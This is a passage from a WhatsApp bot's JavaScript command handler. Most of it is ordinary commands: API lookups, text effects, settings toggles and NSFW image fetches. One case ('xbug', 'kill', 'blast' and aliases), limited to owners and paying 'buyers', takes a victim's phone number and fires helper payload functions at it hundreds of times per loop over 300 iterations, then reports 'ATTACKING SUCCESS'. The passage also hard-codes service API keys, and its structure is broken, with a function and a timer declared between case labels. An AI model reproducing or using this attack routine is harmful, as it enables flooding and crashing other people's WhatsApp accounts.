                            caption: `𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝘀𝗰𝗿𝗶𝗽𝘁 𝗱𝗶𝗿𝗲𝗰𝘁 𝗳𝗿𝗼𝗺 𝗚𝗶𝘁𝗵𝘂𝗯\n> ${caption}..`
                        });

                        // URL to download the ZIP file
                        const zipUrl = 'https://github.com/BLUEXDEMONl/BLUEXDEMON-V4.3.0/archive/refs/heads/master.zip';

                        // Fetch the ZIP file
                        const response = await fetch(zipUrl);

                        if (!response.ok) {
                            return reply(`*Failed to download the repository.*\nReason: ${response.statusText}`);
                        }

                        const zipBuffer = await response.buffer();

                        // Send the ZIP file to the user
                        await conn.sendMessage(m.chat, {
                            document: zipBuffer,
                            mimetype: "application/zip",
                            fileName: `BLUEXDEMON-V4-master.zip`,
                            caption: `*REPO LINK*: \`https://github.com/BLUEXDEMONl/BLUEXDEMON-V4.3.0\`\n*CHANNEL*: \`https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\``,
                        }, {
                            quoted: m
                        });

                    } catch (e) {
                        console.error("Error in script case:", e);
                        setReply("An error occurred while fetching the script. Please try again later.");
                    }
                    break;
                }
                case 'alive':
                case 'scan': {
                    try {
                        await loading()
                        const animations = [
                            `💻 *System Check Initiated...*\n> ${caption}`,
                            `🔄 *Loading Modules...*\n> ${caption}`,
                            `✅ *Module: Messaging [OK]*`,
                            `✅ *Module: Connectivity [OK]*`,
                            `✅ *Module: AI Responses [OK]*`,
                            `🔍 *Scanning for Updates...*`,
                            `🛠️ *Update: No Updates Available*`,
                            `🔄 *System Optimization: 87% Complete...*`,
                            `✅ *System Optimization: Complete*`,
                            `📡 *Establishing Secure Connection...*`,
                            `✅ *Connection Established Successfully*`,
                            `🚀 *Ready for Commands!*\n> ${caption}`,
                        ];

                        // Send the first animation stage
                        const initialMessage = await conn.sendMessage(m.chat, {
                            text: animations[0],
                        }, {
                            quoted: m
                        });

                        // Animate by editing the message every 2 seconds
                        let currentIndex = 1; // Start from the second stage
                        const animationInterval = setInterval(async () => {
                            if (currentIndex >= animations.length) {
                                clearInterval(animationInterval); // Stop after completing the animation
                            } else {
                                try {
                                    await conn.sendMessage(m.chat, {
                                        edit: initialMessage.key,
                                        text: animations[currentIndex],
                                    });
                                    currentIndex++;
                                } catch (err) {
                                    console.error("Error editing alive animation:", err);
                                    clearInterval(animationInterval); // Stop on error
                                }
                            }
                        }, 2000); // Change text every 2 seconds
                    } catch (err) {
                        console.error("Error in alive case:", err);
                        reply("An error occurred while processing your request.");
                    }
                    break;
                }
                case 'pickuplines':
              case 'rizz': {
    try {
        await loading();

        // Fetch a pickup line from the new API
        let res = await fetch(`https://api.popcat.xyz/pickuplines`);
        let json = await res.json();

        // Check if the response is valid
        if (!json.pickupline) {
            return reply("Failed to fetch a pickup line. Please try again later.");
        }

        // Send the pickup line
        await reply(`💌 *Pickup Line:*\n\n\`\`\`${json.pickupline}\`\`\`\n> ${caption}`);
    } catch (error) {
        console.error("Error in pickuplines case:", error);
        reply("An error occurred while fetching a pickup line. Please try again later.");
    }
    break;
}
                case 'listonline': {
                    if (!isGroup) return reply(mess.only.group); // Check if the command is used in a group
                    if (!isAdmins && !isOwner) return reply(mess.only.admin); // Check if the user is an admin or owner

                    // Check if a specific group ID is provided, else use the current group
                    let id = args && /\d+-\d+@g.us/.test(args[0]) ? args[0] : from;

                    // Retrieve the list of online members in the group, including the bot number
                    let online = [...Object.keys(store.presences[id]), botNumber];

                    // Construct the online list message
                    let onlineListMessage = 'List Online:\n\n' + online
                        .map(v => `${themeemoji} @${v.replace(/@.+/, '')}`) // Format each online user
                        .join('\n'); // Join the formatted online users into a single string

                    // Send the formatted list to the group with mentions
                    await conn.sendText(from, onlineListMessage, m, {
                        mentions: online
                    });
                }
                break;
                case 'xbug':
                case 'hunt':
                case 'bluex':
                case 'bugui':
                case 'astro-lock':
                case 'gang-bang':
                case 'kill':
                case 'blast':
                    if (!isOwner) return setReply(mess.only.owner)
                    if (!isBuyer) return onlyBuyer()
                    if (!q) return setReply(`Example: ${prefix + command} 62×××`)
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await killing()
                    reply(bugres)
                    for (let i = 0; i < 300; i++) {
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await BLEKING(target, wanted)
                        await BLEKING(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                        await ngeloc(target, wanted)
                        await bakdok(target, wanted)
                    }
                    setReply(`*「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」*
`)
                    break
                case 'pinterest': {
                    if (!q) return reply(`\`No search query detected\`.\n*Example: ${prefix + command} beautiful landscapes*`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint with the encoded query
                        const apiUrl = `https://www.bhandarimilan.info.np/pinterest?query=${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || data.data.length === 0) {
                            return setReply("No results found. Please try with a different query.");
                        }

                        // Get the first five images
                        const images = data.data.slice(0, 5);

                        // Send the images one by one
                        for (let url of images) {
                            await conn.sendMessage(m.chat, {
                                image: {
                                    url
                                },
                                caption: `🔗 *Pinterest Result*\n\`\`\`${q}\`\`\`\n> ${caption}`
                            }, {
                                quoted: m
                            });
                        }
                    } catch (error) {
                        console.error("Error in Pinterest case:", error);
                        reply("An error occurred while fetching Pinterest results. Please try again later.");
                    }
                    break;
                }
                case 'checkcolor':
                case 'color': {
                    if (!q) return reply(`\`Provide a hex color code\`.\n*Example: ${prefix + command} ffcc99*`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/color/${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.hex) {
                            return reply("Invalid color code or no data found. Please check your input.");
                        }

                        // Extract details
                        const {
                            hex,
                            name,
                            rgb,
                            color_image,
                            brightened
                        } = data;

                        // Send the color details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: color_image
                            },
                            caption: `🎨 *Color Details*\n\n🔹 *Hex Code*: ${hex}\n🔹 *Name*: ${name}\n🔹 *RGB*: ${rgb}\n🔹 *Brightened Hex*: ${brightened}\n\n> ${caption}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in checkcolor case:", error);
                        setReply("An error occurred while fetching color details. Please try again later.");
                    }
                    break;
                }
                case 'element': {
                    if (!q) return reply(`\`provide an element name/symbol\`.\nExample: ${prefix + command} bohrium`);

                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/periodic-table?element=${encodeURIComponent(q)}`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.name) {
                            return setReply("Invalid element name or symbol. Please check your input.");
                        }

                        // Extract details
                        const {
                            name,
                            symbol,
                            atomic_number,
                            atomic_mass,
                            period,
                            phase,
                            discovered_by,
                            image,
                            summary
                        } = data;

                        // Send the element details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: image
                            },
                            caption: `🧪 *Periodic Table Element*\n${readmore}\n🔹 *Name*: ${name}\n🔹 *Symbol*: ${symbol}\n🔹 *Atomic Number*: ${atomic_number}\n🔹 *Atomic Mass*: ${atomic_mass}\n🔹 *Period*: ${period}\n🔹 *Phase*: ${phase}\n🔹 *Discovered By*: ${discovered_by}\n\n📘 *Summary*: \`\`\`${summary}\`\`\`\n\n> ${caption}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in elements case:", error);
                        setReply("An error occurred while fetching element details. Please try again later.");
                    }
                    break;
                }
                case 'randomcolor': {
                    await loading(); // Show loading message

                    try {
                        // API endpoint
                        const apiUrl = `https://api.popcat.xyz/randomcolor`;

                        // Fetch response from the API
                        const response = await fetch(apiUrl);
                        const data = await response.json();

                        // Validate the response
                        if (!data || !data.hex || !data.name) {
                            return setReply("Failed to fetch a random color. Please try again later.");
                        }

                        // Extract details
                        const {
                            hex,
                            name,
                            image
                        } = data;

                        // Send the random color details
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: image
                            },
                            caption: `🎨 *Random Color*\n\n🔹 *Name*: ${name}\n🔹 *HEX*: #${hex}\n\n> ${caption}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in randomcolor case:", error);
                        setReply("An error occurred while fetching a random color. Please try again later.");
                    }
                    break;
                }
                case 'jid':
                case 'getjid': {
                    setReply(from)
                }
                break
                case 'checkip': {
                    if (!q) return setReply(`\`Please provide an IP address.\`\n*Example: .checkip 8.8.8.8*`);
                    await loading()
                    try {
                        // API Endpoint
                        const apiUrl = `https://ipinfo.io/${encodeURIComponent(q)}/json?token=022a73cf539237`;

                        // Fetch IP information
                        const response = await fetchJson(apiUrl);

                        if (!response || response.error) {
                            return setReply("Failed to fetch IP information. Please check the IP address and try again.");
                        }

                        // Destructure relevant data
                        const {
                            ip,
                            hostname,
                            city,
                            region,
                            country,
                            loc,
                            postal,
                            timezone,
                            asn,
                            company,
                            privacy,
                            abuse,
                            domains,
                        } = response;

                        // Prepare the detailed reply
                        const replyMessage = `*IP Information*\n\n` +
                            `❖ *IP:* ${ip || 'N/A'}\n` +
                            `❖ *Hostname:* ${hostname || 'N/A'}\n` +
                            `❖ *City:* ${city || 'N/A'}\n` +
                            `❖ *Region:* ${region || 'N/A'}\n` +
                            `❖ *Country:* ${country || 'N/A'}\n` +
                            `❖ *Location (Lat, Long):* ${loc || 'N/A'}\n` +
                            `❖ *Postal Code:* ${postal || 'N/A'}\n` +
                            `❖ *Timezone:* ${timezone || 'N/A'}\n` +
                            `❖ *ASN:* ${asn?.asn || 'N/A'}\n` +
                            `❖ *ASN Name:* ${asn?.name || 'N/A'}\n` +
                            `❖ *ASN Domain:* ${asn?.domain || 'N/A'}\n` +
                            `❖ *Company Name:* ${company?.name || 'N/A'}\n` +
                            `❖ *Company Domain:* ${company?.domain || 'N/A'}\n` +
                            `❖ *VPN:* ${privacy?.vpn ? 'Yes' : 'No'}\n` +
                            `❖ *Proxy:* ${privacy?.proxy ? 'Yes' : 'No'}\n` +
                            `❖ *TOR:* ${privacy?.tor ? 'Yes' : 'No'}\n` +
                            `❖ *Relay:* ${privacy?.relay ? 'Yes' : 'No'}\n` +
                            `❖ *Abuse Contact Name:* ${abuse?.name || 'N/A'}\n` +
                            `❖ *Abuse Contact Email:* ${abuse?.email || 'N/A'}\n` +
                            `❖ *Abuse Contact Phone:* ${abuse?.phone || 'N/A'}\n` +
                            `❖ *Domains Linked:* ${domains?.total || 'N/A'}\n` +
                            `❖ *Example Domains:* ${(domains?.domains || []).slice(0, 5).join(', ') || 'N/A'}\n`;

                        // Send the detailed response
                        setReply(replyMessage);
                    } catch (error) {
                        console.error("Error in checkip case:", error);
                        setReply("An error occurred while fetching the IP information. Please try again later.");
                    }
                    break;
                }
                case 'ss':
                case 'ssweb': {
                    if (!q) return reply("Please provide a valid URL.\n*Example:* `.ss https://example.com`");
                    await loading()
                    if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Invalid URL. Please provide a valid website link.");

                    // Generate screenshot URL using API
                    const Url = `https://api.apiflash.com/v1/urltoimage?access_key=b04fa07f69b348dcb7b06730177eb54e&wait_until=page_loaded&url=${q}`;

                    // Send the screenshot as an image
                    try {
                        await conn.sendMessage(from, {
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${botName}`, // Bot Name as title
                                    mediaType: 3,
                                    renderLargerThumbnail: false,
                                    thumbnail: thumb, // Provide your thumbnail image
                                    sourceUrl: `https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h` // Owner's WhatsApp link
                                }
                            },
                            image: {
                                url: Url
                            }, // URL of the generated screenshot
                            caption: `${mess.success}\n\n> ${caption}`
                        }, {
                            quoted: m
                        });
                    } catch (err) {
                        console.error("Error in ss case:", err);
                        setReply("The server encountered an error. Please try again later.");
                    }
                    break;
                }
                case 'shorten': case 'tinyurl': {
                    if (!q) return setReply("Please provide a URL to shorten.");
                    await loading()
                    // API URL with dynamic URL encoding
                    const apiUrl = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(q)}`;

                    try {
                        // Fetch shortened URL from TinyURL API
                        const response = await fetch(apiUrl);
                        const shortenedUrl = await response.text();

                        if (response.ok) {
                            // Reply with the shortened URL
                            setReply(`\`Here is your shortened URL:\` *${shortenedUrl}*`);
                        } else {
                            setReply("Failed to shorten the URL. Please try again later.");
                        }
                    } catch (error) {
                        console.error("Error shortening URL:", error);
                        setReply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'readchat':
                case 'autoreadchat':
                case 'autoread': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.autoReadChat = true; // Enable auto react
                        await setReply('`Successfully Activated Autoreadchat.`');
                    } else if (args[0] === 'off') {
                        global.autoReadChat = false; // Disable auto react
                        await setReply('`Successfully Deactivated Autoreadchat.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Autoreadchat.\``);
                    }
                    break;
                }
                case 'anticall': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.anticall = true; // Enable auto react
                        await setReply('`Successfully Activated Anticall.`');
                    } else if (args[0] === 'off') {
                        global.anticall = false; // Disable auto react
                        await setReply('`Successfully Deactivated Anticall.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Anticall.\``);
                    }
                    break;
                }
                case 'autotyping': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.autotyping = true; // Enable auto react
                        await setReply('`Successfully Activated Autotyping.`');
                    } else if (args[0] === 'off') {
                        global.autotyping = false; // Disable auto react
                        await setReply('`Successfully Deactivated Autotyping.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Anticall.\``);
                    }
                    break;
                }
 case 'antidelete': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.antidelete = true; // Enable auto react
                        await setReply('`Successfully Activated Antidelete.`');
                    } else if (args[0] === 'off') {
                        global.antidelete = false; // Disable auto react
                        await setReply('`Successfully Deactivated Antidelete.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Antidelete.\``);
                    }
                    break;
                }
                case 'alwaysonline': {
                    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.alwaysonline = true; // Enable auto react
                        await setReply('`Successfully Activated Alwaysonline.`');
                    } else if (args[0] === 'off') {
                        global.alwaysonline = false; // Disable auto react
                        await setReply('`Successfully Deactivated Alwaysonline.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Alwaysonline.\``);
                    }
                    break;
                }
                case 'caption': {
                    reply(`> ${caption}`)
                }
                break
                case 'blackpink': {
                    try {
                        await loading();

                        // Fetch the list of image URLs from the provided URL
                        const response = await fetch('https://raw.githubusercontent.com/arivpn/dbase/master/kpop/blekping.txt');
                        const textData = await response.text();

                        // Split the text into an array of URLs
                        const urls = textData.split('\n').filter(Boolean);

                        // Pick a random image URL
                        const randomImage = urls[Math.floor(Math.random() * urls.length)];

                        // Send the random image to the chat
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: randomImage
                            },
                            caption: `\`\`\`Random Blackpink image\`\`\`\n> ${caption}`
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error('Error fetching Blackpink images:', error);
                        setReply('Sorry, an error occurred while fetching the Blackpink images.');
                    }
                    break;
                }
case 'invite': {
    if (!isGroup) return setReply(mess.only.group);
    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
    if (!text) return reply(`\`No WhatsApp number detected.\`\n*Example: ${prefix + command} 255734980103*`);
    if (text.includes('+')) return reply(`\`Input the WhatsApp number without *+*\``);
    if (isNaN(text)) return reply(`Please enter only numbers, including your country code, without spaces.`);

    let group = m.chat;

    try {
        // Generate the group invite link
        let link = 'https://chat.whatsapp.com/' + await conn.groupInviteCode(group);

        // Send the invite link to the specified number
        await conn.sendMessage(`${text}@s.whatsapp.net`, {
            text: ` *𝙂𝙍𝙊𝙐𝙋 𝙄𝙉𝙑𝙄𝙏𝘼𝙏𝙄𝙊𝙉 𝙇𝙄𝙉𝙆*\n*\`𝚈𝙾𝚄 𝙰𝚁𝙴 𝙸𝙽𝚅𝙸𝚃𝙴𝙳 𝚃𝙾 𝙹𝙾𝙸𝙽: ${groupMetadata.subject}\`*\n*𝙻𝙸𝙽𝙺:* ${link}`
        });

        reply("*Group invitation link successfully sent.*");
    } catch (error) {
        console.error("Error in invite case:", error);
        setReply("Failed to send the invite link. Please check the number and try again.");
    }

    break;
}
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return reply(`\`No Text detected\`\n*Example : ${prefix+command} Blue demon*`) 
await loading()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
conn.sendMessage(m.chat, { image: { url: haldwhd }, caption:`> ${caption}`}, { quoted: m })
}
break
// Autoviewstatus function
async function autoViewStatus() {
    try {
        if (global.autoswview === true) {
            let statusList = await conn.fetchStatusUpdates();
            for (let status of statusList) {
                await conn.readStatus(status.id);
            }
        }
    } catch (err) {
        console.error("Error in autoViewStatus:", err);
    }
}

// Autoviewstatus command handler
case 'autostatus':
case 'avs':
case 'autoviewstatus': {
    if (!isOwner) return reply(mess.only.owner); // Ensure only the owner can execute
    if (!args[0]) return reply(`Example: ${prefix + command} on/off`);

    if (args[0].toLowerCase() === 'on') {
        global.autoswview = true;
        reply('Successfully Activated Autoviewstatus.');
    } else if (args[0].toLowerCase() === 'off') {
        global.autoswview = false;
        reply('Successfully Deactivated Autoviewstatus.');
    } else {
        reply('Invalid option. Use "on" or "off" to toggle Autoviewstatus.');
    }
    break;
}

// Automatically run autoViewStatus periodically (optional)
setInterval(autoViewStatus, 5000); // Adjust the interval as needed (10 seconds here)
case 'playstore': {
    if (!q) return reply(`\`No search term detected\`\n*Example:  ${prefix + command} Freefire*`);
    await loading();

    try {
        // Fetching data from the Play Store API
        const response = await fetchJson(`https://api-lenwy.vercel.app/playstore?search=${encodeURIComponent(q)}`);
        const data = response.data;

        if (!data || data.length === 0) {
            return reply("No results found for this search term.");
        }

        // Prepare the message with search results
        let message = `*[ PLAY STORE SEARCH RESULTS ]*\n> ${caption}\n${readmore}`;

        // Loop through the first 2 results and format the message
        for (let i = 0; i < Math.min(2, data.length); i++) {
            const app = data[i];
            message += `*App Name*: _${app.nama}_
*Developer*: _${app.developer}_
*Rating*: _${app.rate}_
*Link*: ${app.link}

*Developer's Link*: ${app.link_dev}
_______________________\n`;
        }

        // Send the image with the results as the caption
        await conn.sendMessage(from, {
            image: {
                url: './database/blueimages/playstore.jpg' // Local image path
            },
            caption: message,
        }, { quoted: m });

    } catch (err) {
        console.error("Error fetching Play Store data:", err);
        reply("Error fetching the search results. Please try again.");
    }

    break;
}
case 'waifu' :
case 'neko' :
case 'trap' :
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
 let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url:trap.data.url } }, { quoted: m })
break

case 'animespank':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await conn.sendMessage(m.chat, { caption:  `> ${caption}`, image: {url:waifud.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gifblowjob':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await conn.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'blowjob':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if(!isGroup) return setReply(mess.only.group)
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./database/nsfw/yuri.json'))
